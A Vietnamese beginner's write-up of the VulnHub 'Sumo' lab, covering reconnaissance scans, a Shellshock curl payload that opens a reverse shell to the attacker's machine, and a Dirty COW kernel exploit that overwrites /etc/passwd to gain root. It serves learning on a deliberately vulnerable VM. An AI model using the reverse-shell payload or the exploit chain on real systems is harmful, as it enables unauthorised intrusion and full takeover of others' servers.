![](https://images.viblo.asia/0f0a8360-798e-44ef-9868-908e0b2bf7bc.png)

# Giới thiệu
Sumo là 1 machine về leo quyền trên Linux được thiết kế bởi SunCSR team, thông tin về machine các bạn có thể xem tại [đây](https://www.vulnhub.com/entry/sumo-1,480/). 

Theo cảm nhận cá nhân mình thì Sumo là bài cơ bản, thích hợp với người mới tiếp cận đến dạng bài leo quyền trên Linux. Sumo cũng là bài đầu tiên mình làm khi tìm hiểu các kiến thức liên quan đến leo quyền nên bài write up này sẽ được trình bày theo từng bước một, từ bước cơ bản nhất cho đến khi lên root. 

Tất nhiên do mới thử sức với mảng leo quyền này nên kiến thức của mình cũng chưa đủ để giải thích cặn kẽ được, vì thế mình rất mong nhận được sự góp ý của mọi người. Giờ thì chúng ta sẽ bắt đầu **lên root machine Sumo**.

# Cài đặt machine
Mỗi machine trên Vulnhub là một máy ảo Linux/Windows được export dưới định dạng OVF. Thông tin về phiên bản của trình giả lập cần có để chạy machine đều được ghi đầy đủ trên trang của mỗi bài.

![](https://images.viblo.asia/574b1bee-b7a5-47a9-b812-85ca7a52c799.png)

Để chạy bài Sumo thì chúng ta nên cài đặt **VMware Workstation Pro 15**, machine đã được kiểm tra trên phiên bản này rồi nên chúng ta có thể cài đặt mà không lo bị lỗi.

Việc cài đặt rất đơn giản: chỉ cần tải file Sumo.zip về, giải nén ra, sau đó trong VMware chọn ***file > open > chọn file ovf/ova > chọn "i copied it"*** là được. Sau khi cài đặt VM rồi, chúng ta cần kiểm tra lại thông tin VM xem Network Adapter đã ở chế độ **NAT** chưa. Nếu đang ở chế độ Bridge thì chúng ta cần chuyển sang chế độ NAT, chỉ cần chọn ***Edit virtual machine settings > tại mục Network Adapter chọn NAT > lưu***.

![](https://images.viblo.asia/41d60173-0359-421a-8e5c-9b68ef299e29.png)

Giờ chỉ cần ***Power on*** máy ảo này lên là được, let's start hacking!

# Lên root

## Tìm kiếm thông tin

Coi như máy ảo là 1 con server đang chạy, và chúng ta đang đứng ở ngoài con server đó. Chúng ta chưa biết phải làm thế nào cả. Vì thế việc đầu tiên là tìm kiếm các thông tin về server. Một số thông tin cần tìm hiểu có thể kể đến là:
- IP của server là gì?
- Server có những cổng nào đang mở?
- Server đang chạy những dịch vụ gì?
- Phiên bản hệ điều hành của server là gì?
- ...

### nmap scan

Những thông tin này có thể tìm kiếm được bằng tool **nmap** cài sẵn trong Kali.  
Đầu tiên hãy kiểm tra xem ip của máy ảo Kali là gì bằng lệnh: ```ip a```

![](https://images.viblo.asia/d0db25be-015c-4755-8d3c-1dc232b3f221.PNG)

IP của máy ảo Kali là **192.168.111.155**  
Bởi máy ảo Kali và Sumo đều cài trên VMware nên chúng sẽ có chung dải IP **192.168.111.0/24**  
Chúng ta sẽ dùng nmap quét toàn bộ ip trong dải này để tìm xem ip của máy ảo Sumo là gì: ```sudo nmap 192.168.111.0/24```

![](https://images.viblo.asia/72a35b42-d402-49b4-9bb1-b3ba81ab609f.PNG)

Giờ chúng ta đã có ip của VM Sumo là **192.168.111.158**  
Bước tiếp theo là kiểm tra kỹ hơn về các cổng đang mở, các dịch vụ đang chạy trên những cổng này, phiên bản hệ điều hành,...  
Tiếp tục scan bằng nmap: ```sudo nmap -sS -sV -O 192.168.111.158```:
- -sS: scan bằng giao tức TCP SYN
- -sV: scan tìm phiên bản của các dịch vụ chạy trên cổng
- -O: scan phiên bản OS

![](https://images.viblo.asia/7fc44945-344f-4cb6-969e-b584cc67f701.PNG)

Kết quả scan cho biết VM chạy Linux phiên bản kernel 2.6.23, mở hai cổng 22 - SSH và 80 - HTTP.  
Giao diện web:

![](https://images.viblo.asia/7f2db8ae-61d2-4901-9b2c-106278aa43ee.PNG)

### Dirsearch

Không có thông tin gì nhiều tại trang web này, vì thế chúng ta nên thử scan các thư mục của web để xem có đường dẫn nào, file nào chứa thông tin có ích hay không. Để scan các đường đẫn web thì có nhiều tool, một số tool phổ biến có thể kể đến như: dirsearch, gobuster, drib, dirbuster,...

Mình thường sử dụng tool [dirsearch](https://github.com/maurosoria/dirsearch) với directory wordlist có sẵn trong Kali: ```python3 dirsearch.py -r -u http://192.168.111.158/ -w /usr/share/dirb/wordlists/common.txt -e *```

![](https://images.viblo.asia/a4ece8d5-3777-4cb0-bb37-6f2495513980.PNG)

Dirsearch scan ra được 1 đường dẫn ẩn có thể truy cập được tại **/cgi-bin/test**, tuy nhiên vẫn không biết phải làm gì :v

![](https://images.viblo.asia/02fe7a9e-ac55-48fa-8711-cd05e448f088.PNG)

###  nikto scan

Lúc này lại phải để tool vào cuộc :v Chúng ta scan tiếp web này bằng tool **Nikto** có sẵn trong Kali: ```nikto -h http://192.168.111.158/```

![](https://images.viblo.asia/a7b061d0-32e2-4aa2-b8ec-31e7f089deb4.PNG)

Kết quả cho thấy web có khả năng khai thác được bằng lỗ hổng **shellshock**. Nikto cũng chỉ ra CVE cho chúng ta. 

## Kết nối reverse shell

Sử dụng lỗ hổng shellshock chúng ta có thể thực hiện RCE để kết nối reverse shell. Thông tin về reverse shell và cách hoạt động các bạn có thể đọc tại [bài viết về Reverse Shell của bạn Hiếu](https://viblo.asia/p/hieu-ro-ve-reverse-shells-LzD5ddE45jY). Hiểu cơ bản thì reverse shell tức là thông qua việc khai thác các lỗ hổng của server như RCE, chúng ta sẽ yêu cầu server của victim thực hiện kết nối với server của chúng ta. Qua kết nối đó server của victim sẽ thực hiện các lệnh shell do chúng ta gõ.

![](https://images.viblo.asia/f187a318-7787-4ed0-a60a-ca421953d539.png)

Chỉ cần tìm kiếm với từ khóa đại loại như "shellshock exploit" chúng ta có ngay payload exploit (1 trong số các link: https://medium.com/@nikhilh20/exploit-bash-shellshock-part-1-ad1636acaf9e):  ```curl -A "() { :; }; /bin/bash_shellshock -i > /dev/tcp/192.168.111.155/1234 0<&1 2>&1" http://192.168.111.158/cgi-bin/test```

![](https://images.viblo.asia/1486944c-12e5-4693-9477-0f1da88d9d01.PNG)

Trước khi chạy command này chúng ta cần mở sẵn cổng 1234 để đợi reverse shell từ server: ```nc -nvlp 1234```.  
Ngay khi chạy command chúng ta sẽ có **reverse shell**.

![](https://images.viblo.asia/a1ae4c01-6100-4823-b310-6ada0bcc82c9.PNG)

## Nâng cấp lên TTY shell

Reverse Shell nhận được khá cùi bắp, rất nhiều lệnh không thể thực hiện được. Vì thế ngay khi có reverse shell mình sẽ tìm cách nâng cấp lên TTY shell (xịn hơn :3). Có nhiều cách để [nâng cấp Reverse Shell lên TTY shell](https://netsec.ws/?p=337), mình kiểm tra qua thấy trên VM có cài python nên sử dụng luôn command ```python -c 'import pty; pty.spawn("/bin/sh")'```

![](https://images.viblo.asia/d0aea17d-4a38-4926-bc1c-a4bb6a71e923.PNG)

Giờ chúng ta đã có TTY shell. Tìm cách lên root thôi!

## Chạy linux-exploit-suggester

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester) là một script hỗ trợ chúng ta tìm kiếm các lỗ hổng có khả năng khai thác được trên hệ thống. Script có rồi, nhưng để chạy được script này trên VM cũng không phải "mì ăn liền" đâu =))

Đầu tiên chúng ta phải tìm một nơi có quyền ghi, bởi hiện tại chúng ta đang là user **www-data**, quyền rất hữu hạn. Sau đó cần tạo 1 http server tại Kali để truyền file sang VM Sumo.

Để tìm các thư mục mà www-data có quyền ghi, chúng ta chạy command: ```find / -type d -writable 2>/dev/null```:
- /: chỉ ra chúng ta sẽ tìm kiếm bắt đầu từ root directory
- -type d: chỉ ra chúng ta cần tìm các thư mục
- -writable: chỉ ra chúng ta cần tìm thư mục mà có quyền ghi
- 2>/dev/null: ẩn mấy cái thông báo không mong muốn thấy, VD như "permission denied" chẳng hạn.

![](https://images.viblo.asia/464b81c7-6864-4eaa-bca3-0a5e968d28d3.PNG)

Trong các thư mục tìm được, mình chọn **/tmp**.

Giờ tại Kali chúng ta sẽ cần tạo 1 http server để truyền file sang VM Sumo. Việc này có thể thực hiện đơn giản với python3 bằng command: ```python3 -m http.server 4444```. Bằng command này, chúng ta tạo ra một http server tại cổng 4444. Và để cho tiện truyền file thì mình sẽ chạy command này tại ***~/Downloads/linux-exploit-suggester/*** luôn, như vậy khi tải file về tại VM Sumo mình sẽ không phải gõ đường dẫn quá dài.

Giờ tại VM Sumo, chúng ta di chuyển đến /tmp và chạy command: ```wget 192.168.111.155:4444/linux-exploit-suggester.sh``` để tải script về. Sau đó chỉ việc cấp quyền chạy script bằng chmod

![](https://images.viblo.asia/093e9f85-b1d4-4683-b3fc-e7c7f5f9183e.PNG)

Kết quả chạy script như sau:

![](https://images.viblo.asia/75628ebb-da4e-437a-9b98-14b479f4a31b.PNG)

![](https://images.viblo.asia/b8e4d61f-5d5a-4683-a3f6-07784f1c5f6b.PNG)

![](https://images.viblo.asia/a8a496f4-571f-4e5f-a536-d739b1954da6.PNG)

Thứ tự các lỗ hổng sắp xếp từ trên xuống theo khả năng khai thác thành công giảm dần. Việc chúng ta làm là thử từng script một cho đến khi exploit thành công.

## Exploit Kernel bằng dirtycow 2

Mã khai thác mình sử dụng là **dirtycow 2**, mã khai thác này nhắm vào các phiên bản Linux kernel thấp. Cách khai thác lỗ hổng kernel khá ít thấy, vì thường các server đều sẽ chạy các phiên bản OS mới, rất ít lỗ hổng kernel. Vì thế khi làm các machine, các lab về leo quyền nếu gặp OS phiên bản thấp thì Kernel exploit là 1 trong số các hướng nên thử đầu tiên.

Để chạy mã dirtycow 2, đầu tiên chúng ta cần tải mã về Kali, link download đã có ngay trong kết quả chạy linux-exploit-suggester. 

![](https://images.viblo.asia/b0ed2edd-026d-4235-afa5-e14fe8a249c4.PNG)

Mã khai thác là một file code C, việc tiếp theo là truyền file code này sang VM Sumo để compile, cách truyền file làm tương tự như khi truyền linux-exploit-suggester.

Cách compile và chạy mã khai thác được ghi ngay trong mã khai thác:

![](https://images.viblo.asia/ab1b71d9-0806-47c8-9bf5-16aec6e63bd3.PNG)

Khi compile tại  VM Sumo, nếu gặp lỗi ***gcc: error trying to exec 'cc1': execvp: No such file or directory*** thì chạy command sau để sửa: ```PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH```

![](https://images.viblo.asia/90b89db2-32ec-4044-80f2-2dc6753fb9c8.PNG)

![](https://images.viblo.asia/d41d8a4a-bc6d-4ff6-98fc-4954eb8a9a6e.PNG)

## Lên root

Sau khi compile thành công, chúng ta cấp quyền thực thi cho mã khai thác và chạy. Mã dirtycow 2 sẽ ghi lại thông tin về user root trong **/etc/passwd** bằng user mới. Mặc định mã dirtycow 2 sẽ tạo user với username là **firefart**, password do chúng ta nhập vào khi chạy mã.

![](https://images.viblo.asia/abe6bffb-aaf6-4886-b01c-261f49c9ff87.PNG)

Giờ chỉ việc chuyển qua **user root (uid=0)** để đọc flag **/root/root.txt**

![](https://images.viblo.asia/a175405b-6ca9-4269-b14b-efb2bdc6ba28.PNG)

ROOTED!!!